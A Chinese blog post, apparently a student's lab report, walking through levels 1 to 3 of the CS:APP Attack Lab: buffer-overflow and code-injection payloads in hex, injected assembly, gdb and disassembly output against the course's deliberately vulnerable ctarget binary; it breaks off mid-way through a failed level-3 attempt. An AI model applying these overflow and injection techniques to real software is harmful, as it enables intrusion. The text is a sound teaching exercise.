
<!DOCTYPE html>
<html lang="zh-cn">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="小黑龙的窝">
    <title>深入理解计算机系统AttackLab实验报告 - 小黑龙的窝</title>
    <meta name="author" content="BlackDragon">
    
    
    
        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
    
    <meta name="description" content="实验答案托管在我的Github上  花了一天时间于2017年5月4日完成了《深入理解计算机系统》的第三个Lab - Attack Lab。这个实验对应于书本第三章：程序的机器级表示中，缓冲区溢出攻击部分。  实验简介Attack Lab是Buffer Lab的64位版本。在这个实验中，目标是通过代码注入攻击（Code Injection Attack）和返回导向编程（Return Oriented">
<meta name="keywords" content="计算机系统,实验">
<meta property="og:type" content="blog">
<meta property="og:title" content="深入理解计算机系统AttackLab实验报告">
<meta property="og:url" content="http://blog.duskdragon.com/2017/05/09/深入理解计算机系统AttackLab实验报告/index.html">
<meta property="og:site_name" content="小黑龙的窝">
<meta property="og:description" content="实验答案托管在我的Github上  花了一天时间于2017年5月4日完成了《深入理解计算机系统》的第三个Lab - Attack Lab。这个实验对应于书本第三章：程序的机器级表示中，缓冲区溢出攻击部分。  实验简介Attack Lab是Buffer Lab的64位版本。在这个实验中，目标是通过代码注入攻击（Code Injection Attack）和返回导向编程（Return Oriented">
<meta property="og:updated_time" content="2017-05-14T16:30:37.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="深入理解计算机系统AttackLab实验报告">
<meta name="twitter:description" content="实验答案托管在我的Github上  花了一天时间于2017年5月4日完成了《深入理解计算机系统》的第三个Lab - Attack Lab。这个实验对应于书本第三章：程序的机器级表示中，缓冲区溢出攻击部分。  实验简介Attack Lab是Buffer Lab的64位版本。在这个实验中，目标是通过代码注入攻击（Code Injection Attack）和返回导向编程（Return Oriented">
    
    
        
    
    
        <meta property="og:image" content="http://blog.duskdragon.com/assets/images/avatar.jpg"/>
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style-2vlb6rbuf0vtqqwvtxzs5fkkvywdbuzxcpzjrb6phlk5lnbldy5aztksln9t.min.css">
    <!--STYLES END-->
    
    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    
        
            
        
    

<header id="header" data-behavior="4">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a class="header-title-link" href="/ ">小黑龙的窝</a>
    </div>
    
        
            <a  class="header-right-picture "
                href="#about">
        
        
            <img class="header-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
        
        </a>
    
</header>

            <!-- Define author's picture -->



        
    

<nav id="sidebar" data-behavior="4">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a href="/#about">
                    <img class="sidebar-profile-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
                </a>
                <h4 class="sidebar-profile-name">BlackDragon</h4>
                
                    <h5 class="sidebar-profile-bio"><p>码龙黑曜 - iOS开发者/计算机科学/兽人控</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/ "
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-home"></i>
                        <span class="sidebar-button-desc">首页</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-categories"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
                        <span class="sidebar-button-desc">分类</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-tags"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
                        <span class="sidebar-button-desc">标签</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-archives"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
                        <span class="sidebar-button-desc">归档</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/about"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-question"></i>
                        <span class="sidebar-button-desc">关于</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://github.com/BlackDragonF" target="_blank" rel="noopener">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-github"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://t.me/BlackDragonF" target="_blank" rel="noopener">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-paper-plane"></i>
                        <span class="sidebar-button-desc">Telegram</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="http://steamcommunity.com/id/BlackDragonF/" target="_blank" rel="noopener">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-steam"></i>
                        <span class="sidebar-button-desc">Steam</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="mailto:obsidiandragon2016@gmail.com" target="_blank" rel="noopener">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-envelope-o"></i>
                        <span class="sidebar-button-desc">邮箱</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/friendly-links"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-link"></i>
                        <span class="sidebar-button-desc">友情链接</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/book-recommend"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-book"></i>
                        <span class="sidebar-button-desc">图书推荐</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="4"
                 class="
                        hasCoverMetaIn
                        ">
                
<article class="post" itemscope itemType="http://schema.org/BlogPosting">
    
    
        <div class="post-header main-content-wrap text-left">
    
        <h1 class="post-title" itemprop="headline">
            深入理解计算机系统AttackLab实验报告
        </h1>
    
    
        <div class="post-meta">
    <time itemprop="datePublished" datetime="2017-05-09T13:56:05+08:00">
	
		    5月 09, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

    
</div>
    
    <div class="post-content markdown" itemprop="articleBody">
        <div class="main-content-wrap">
            <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/AttackLab" target="_blank" rel="external">Github</a>上</p>
<blockquote>
<p>花了一天时间于2017年5月4日完成了《深入理解计算机系统》的第三个Lab - Attack Lab。这个实验对应于书本第三章：程序的机器级表示中，缓冲区溢出攻击部分。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Attack Lab是Buffer Lab的64位版本。在这个实验中，目标是通过代码注入攻击（Code Injection Attack）和返回导向编程（Return Oriented Programming）两种攻击方式，分别修改具有缓冲区溢出漏洞的两个x86_64可执行文件的行为。</p>
<p>本实验主要加深了对于栈规则的理解，以及说明了缓冲区溢出漏洞可能造成的危险后果。</p>
<p>本实验使用了官网给出的自学者讲义中的<a href="http://csapp.cs.cmu.edu/3e/target1.tar" target="_blank" rel="external">Ubuntu 12.4 targets</a>，并且使用了运行时参数-q来避免该程序连接远程的计分服务器。</p>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>实验讲义中的target1.tar主要包含了以下文件：</p>
<ul>
<li>README.txt 描述了目录内容</li>
<li>ctarget 一个易受代码注入攻击的可执行程序</li>
<li>rtarget 一个易受返回导向编程攻击的可执行程序</li>
<li>cookie.txt 在攻击中用到的唯一标识符，是8位的16进制代码</li>
<li>farm.c 目标程序的”Gadget Farm”的源代码，你将利用这些代码去生成返回导向编程攻击</li>
<li>hex2raw 一个生成攻击字符串的工具</li>
</ul>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>答案不能使用攻击去避免程序的正确性检查代码。具体来说，ret指令返回的目的地只能是以下3种：</p>
<ul>
<li>函数touch1, touch2, touch3的地址</li>
<li>攻击注入代码的地址</li>
<li>gadget farm中gadgets的地址</li>
</ul>
<p>rtarget中只能用函数start_farm和函数end_farm之间的函数来生成gadget。</p>
<h2 id="目标程序"><a href="#目标程序" class="headerlink" title="目标程序"></a>目标程序</h2><p>目标程序ctarget和rtarget都使用getbuf函数从标准输入流中读取字符串，getbuf函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> buf[BUFFER_SIZE];</div><div class="line">	Gets(buf);</div><div class="line">	<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Gets函数同标准库函数gets相似，其从标准输入流中读入以’\n’或者是EOF结尾的字符串并且将其存储在制定的地址。在这段代码中，目标地址是一个长BUFFER_SIZE的字符数组。<br>但同时Gets()和gets()都不具备检测目的缓冲区是否足够大以存储输入的字符串的功能，因此可能存在缓冲区溢出的风险。在本次实验中，我们要利用该缓冲区溢出漏洞，改变目标程序的行为。</p>
<p>对于自学者来说，运行target的程序的时候需要带上参数-q以避免其连接并不存在的计分服务器。同时需要注意，用来生成攻击字符串的16进制的代码的任意中间位置都不能包含0a，因为其ascii表示是’\n’，在其之后的任意代码都不会被目标程序读入了。</p>
<h2 id="实验过程及分析"><a href="#实验过程及分析" class="headerlink" title="实验过程及分析"></a>实验过程及分析</h2><h3 id="第1部分-代码注入（Code-Injection）攻击"><a href="#第1部分-代码注入（Code-Injection）攻击" class="headerlink" title="第1部分 代码注入（Code Injection）攻击"></a>第1部分 代码注入（Code Injection）攻击</h3><p>本部分总共包含3个阶段，需要生成相应的攻击字符串去攻击ctarget。目标文件ctarget的栈位置是固定的，并且栈上的代码可执行。这为我们的代码注入攻击提供了机会。</p>
<h4 id="等级1"><a href="#等级1" class="headerlink" title="等级1"></a>等级1</h4><p>阶段一不需要注入自己的代码，攻击字符串只需要将程序重定向至已有的过程即可。</p>
<p>在ctarget中，函数getbuf被test函数调用，而test函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> val;</div><div class="line">	val = getbuf();</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>现在我们需要修改程序的行为，让程序从getbuf返回时不返回到test函数中，而跳转至touch1函数。函数touch1如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	vlevel = <span class="number">1</span>;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</div><div class="line">	validate(<span class="number">1</span>);</div><div class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先，我们对于目标可执行程序ctarget使用objdump -d ctarget &gt; ctarget-disassemble生成ctarget的反汇编代码。然后观察反汇编代码中的getbuf函数，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00000000004017a8 &lt;getbuf&gt;:</div><div class="line">  4017a8:       48 83 ec 28             sub    <span class="variable">$0x28</span>,%rsp</div><div class="line">  4017ac:       48 89 e7                mov    %rsp,%rdi</div><div class="line">  4017af:       e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</div><div class="line">  4017b4:       b8 01 00 00 00          mov    <span class="variable">$0x1</span>,%eax</div><div class="line">  4017b9:       48 83 c4 28             add    <span class="variable">$0x28</span>,%rsp</div><div class="line">  4017bd:       c3                      retq   </div><div class="line">  4017be:       90                      nop</div><div class="line">  4017bf:       90                      nop</div></pre></td></tr></table></figure></p>
<p>通过观察sub $0x28,%rsp可以知道，getbuf在局部栈上开辟了大小为40个字节的空间，据此我们可以推测BUFFER_SIZE为40。那么，如果我们输入的字符串长度超过了40个字节，就会造成缓冲区溢出。</p>
<p>这里我们需要复习一下函数栈帧的相关知识。被调用者Q的栈帧自栈底（高地址）到栈顶（低地址）包括了被保存的寄存器，局部变量和参数构造区。而调用者Q的栈帧自栈底到栈顶包括了参数以及返回地址。</p>
<p>对于getbuf函数来说，不存在被保存的寄存器，在缓冲区溢出之后，溢出的字符会直接覆盖调用者栈帧中的返回地址。因此，直接使用touch1的起始地址作为溢出的字符串覆盖返回地址即可。</p>
<p>我们观察反汇编代码中touch1函数的起始地址，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">00000000004017c0 &lt;touch1&gt;:</div></pre></td></tr></table></figure><br>据此可以得出攻击代码的16位表示如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">c0 17 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>其中，前40个字节的内容无关紧要（只要不是0a即可），因为它们属于未溢出的部分。这段攻击代码中而真正起作用的是缓冲区溢出的部分，即最后的8个字节。同时要注意到x86_86的机器是小端表示的字节序，即低位放在低字节，高位放在高字节，并且栈的增长方向是由低地址增长到高地址。所以最后8个字节的顺序为 c0 17 40 00 00 00 00 00。<br>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level1/level1.txt|./hex2raw|./ctarget -q</div><div class="line">数Cookie: 0x59b997fa</div><div class="line">Type string:Touch1!: You called touch1()</div><div class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:ctarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 C0 17 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级2"><a href="#等级2" class="headerlink" title="等级2"></a>等级2</h4><p>阶段2需要在攻击字符串中注入少量的代码。</p>
<p>在ctarget中，函数touch2如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></div><div class="line">&#123;</div><div class="line">	vlevel = <span class="number">2</span>;</div><div class="line">	<span class="keyword">if</span> (val == cookie) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</div><div class="line">		validate(<span class="number">2</span>);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Misfire: you called touch2(0x%.8x)\n"</span>, val);</div><div class="line">		fail(<span class="number">2</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>任务是让ctarget执行函数touch2的代码而不是直接返回到test函数。并且，你必须假装你已经传递了cookie的值作为touch2的参数。</p>
<p>考虑到在ctarget中，栈地址固定以及允许在栈上执行代码，所以我们可以通过缓冲区溢出漏洞将返回地址指定到栈上，在栈上执行相应的指令，为函数touch2设置参数，最后再从栈上返回至touch2函数即可。</p>
<p>同阶段一相似，攻击代码的前40个字节无关紧要（只要不是0a），第41-48个字节指定了getbuf的返回地址，为了让函数能返回到栈上执行代码，我们需要知道栈地址。</p>
<p>使用gdb加载ctarget，并为getbuf函数设置断点，执行程序，当程序因为断点而暂停的时候打印rsp的值。具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(gdb) <span class="built_in">break</span> getbuf</div><div class="line">Breakpoint 1 at 0x4017a8: file buf.c, line 12.</div><div class="line">(gdb) run -q</div><div class="line">Starting program: /home/zhihaochen/CSAPPLabs/AttackLab/target1/ctarget -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line"></div><div class="line">Breakpoint 1, getbuf () at buf.c:12</div><div class="line">12	buf.c: 没有那个文件或目录.</div><div class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$rsp</span></div><div class="line"><span class="variable">$1</span> = 0x5561dca0</div></pre></td></tr></table></figure><br>从中可以得出结论，ctarget在执行getbuf时的栈地址（指向返回地址）为0x5561dca0。因此我们应该将返回地址指定为0x5561dca8。</p>
<p>然后我们用gcc和objdump来生成攻击代码。首先新建一个exploit.s文件，并在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x59b997fa, %edi <span class="comment">;设置cookie为参数</span></div><div class="line"><span class="keyword">add</span> <span class="number">$16</span>, %rsp <span class="comment">;将rsp指向下一个返回地址（函数touch2的地址）</span></div><div class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></div></pre></td></tr></table></figure><br>其中add $16,%rsp的值可能需要修改，这是因为我们无法确定这段汇编代码反汇编后占多少字节。同时，我们也要保证rsp移动的位数是8的倍数，这是栈的特性（即push和pop时操作数据的大小为一个机器字长）决定的。</p>
<p>写完了攻击代码后，我们依次使用<code>gcc -c exploit.s</code>以及<code>objdump -d exploit.o &gt; exploit.d</code>将攻击代码汇编和反汇编。具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; gcc -c exploit.s                                             </div><div class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; objdump -d exploit.o &gt; exploit.d                             </div><div class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; cat exploit.d                                                 </div><div class="line"></div><div class="line">exploit.o：     文件格式 elf64-x86-64</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">0000000000000000 &lt;.text&gt;:</div><div class="line">   0:	bf fa 97 b9 59       	mov    <span class="variable">$0x59b997fa</span>,%edi</div><div class="line">   5:	48 83 c4 10          	add    <span class="variable">$0x10</span>,%rsp</div><div class="line">   9:	c3                   	retq   </div></pre></td></tr></table></figure><br>总共是10个字节，小于16个字节，因此源攻击代码中的add $16,%rsp可以直接使用，无需继续更改。<br>最后我们在ctarget-disassemble中观察函数touch2的起始地址，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">00000000004017ec &lt;touch2&gt;:</div></pre></td></tr></table></figure></p>
<p>根据以上的信息，我们最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</div><div class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</div><div class="line">bf fa 97 b9 59 48 83 c4</div><div class="line">10 c3 00 00 00 00 00 00 /* 攻击代码 */</div><div class="line">ec 17 40 00 00 00 00 00 /* 返回地址 指向函数touch2 */</div></pre></td></tr></table></figure><br>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level2/level2.txt|./hex2raw|./ctarget -q     </div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Touch2!: You called touch2(0x59b997fa)</div><div class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:ctarget:2:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 A8 DC 61 55 00 00 00 00 BF FA 97 B9 59 48 83 C4 10 C3 00 00 00 00 00 00 EC 17 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级3"><a href="#等级3" class="headerlink" title="等级3"></a>等级3</h4><p>阶段3同样包含了代码注入攻击，但是这次需要将一个字符串作为参数传入。<br>在ctarget中，函数hexmatch和touch3的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> cbuf[<span class="number">110</span>];</div><div class="line">	<span class="comment">/* Make position of check string unpredictable */</span></div><div class="line">	<span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</div><div class="line">	<span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</div><div class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></div><div class="line">&#123;</div><div class="line">	vlevel = <span class="number">3</span>;		<span class="comment">/* Part of validation protocol */</span></div><div class="line">	<span class="keyword">if</span> (hexmatch(cookie,sval)) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</div><div class="line">		validate(<span class="number">3</span>);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</div><div class="line">		fail(<span class="number">3</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>任务是让程序执行touch3的代码而不是直接返回到test，你必须假装你已经将一个cookie的字符串表示作为参数传递给了touch3。</p>
<p>该阶段的思路同阶段二相似，不同的是，阶段二要求传递的参数是一个数字，而阶段三要求传递的参数是一个自己构造的字符串的首地址。因此，我们需要将目标字符串也通过缓冲区溢出攻击注入到栈段，并且将其首地址设置为%rdi。</p>
<p>现在我们来构造攻击字符串，首先，同阶段一和阶段二一样，攻击字符串的前40个字符串无关紧要（只要不是0a），第41-48个字节指定了getbuf的返回地址，同阶段二一样，我们将该返回地址设置为0x5561dca8。</p>
<p>接下来我们使用gcc和objdump来生成攻击代码。首先新建一个exploit.s文件，并在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x0, %edi <span class="comment">;设置第一个参数指向一个字符串（保留）</span></div><div class="line"><span class="keyword">add</span> <span class="number">$16</span>, %rsp <span class="comment">;将rsp指向下一个返回地址（函数touch3的地址）</span></div><div class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></div></pre></td></tr></table></figure><br>注意，在构造该攻击字符串的时候，我们还不知道cookie的字符串的表示的首地址。故我们先使用0x0进行占位。生成最后的攻击字符串时只要用相应的栈地址替换0x0即可。</p>
<p>写完攻击代码之后，我们依次使用gcc和objdump进行汇编和反汇编，具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; gcc -c exploit.s                                             </div><div class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; objdump -d exploit.o &gt; exploit.d                             </div><div class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; cat exploit.d                                                </div><div class="line"></div><div class="line">exploit.o：     文件格式 elf64-x86-64</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">0000000000000000 &lt;.text&gt;:</div><div class="line">   0:	bf 00 00 00 00       	mov    <span class="variable">$0x0</span>,%edi</div><div class="line">   5:	48 83 c4 10          	add    <span class="variable">$0x10</span>,%rsp</div><div class="line">   9:	c3                   	retq   </div></pre></td></tr></table></figure></p>
<p>在攻击代码之后，栈上紧跟着的应该是该攻击代码的返回地址，毫无疑问，在这里我们需要将返回地址指向函数touch3的起始地址。</p>
<p>现在需要讨论的问题是，字符串应该放在栈上的什么地方？首先我们可以考虑将字符串放置在攻击字符串的前40个字节中。这样，具体的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">35 39 62 39 39 37 66 61</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 其中最后16个字节保存了cookie的字符串表示 */</div><div class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</div><div class="line">bf 90 dc 61 55 48 83 c4 /* 攻击代码 其中将%rdi指向cookie的字符串表示的首地址 */</div><div class="line">10 c3 00 00 00 00 00 00</div><div class="line">fa 18 40 00 00 00 00 00 /* 返回地址 指向函数touch3 */</div></pre></td></tr></table></figure><br>下面我们用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3-2.txt|./hex2raw|./ctarget -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Misfire: You called touch3(<span class="string">""</span>)</div><div class="line">FAIL: Would have posted the following:</div><div class="line">	user id	